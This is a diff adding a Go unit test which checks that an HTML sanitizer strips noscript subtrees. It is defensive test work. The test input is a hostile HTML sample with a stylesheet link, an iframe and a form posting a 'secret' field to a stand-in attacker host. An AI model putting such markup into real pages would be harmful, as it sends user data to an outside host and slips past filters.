@@ -156,3 +156,19 @@ func TestSanitizeDiscardsImportedStyleBlocks(t *testing.T) {
 		}
 	}
 }
+
+func TestSanitizeDiscardsNoscriptSubtrees(t *testing.T) {
+	input := `<html><head><noscript><link rel="stylesheet" href="https://attacker.example/evil.css"></noscript></head><body><noscript><form action="https://attacker.example/collect"><input name="secret"><iframe src="https://attacker.example/frame"></iframe></form></noscript><p>safe</p></body></html>`
+	got, err := Sanitize(input, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, forbidden := range []string{"<noscript", "attacker.example", "name=\"secret\"", "<iframe", "<form"} {
+		if strings.Contains(got, forbidden) {
+			t.Fatalf("noscript subtree survived sanitization (%s): %s", forbidden, got)
+		}
+	}
+	if !strings.Contains(got, "<p>safe</p>") {
+		t.Fatalf("ordinary content was removed with noscript: %s", got)
+	}
+}
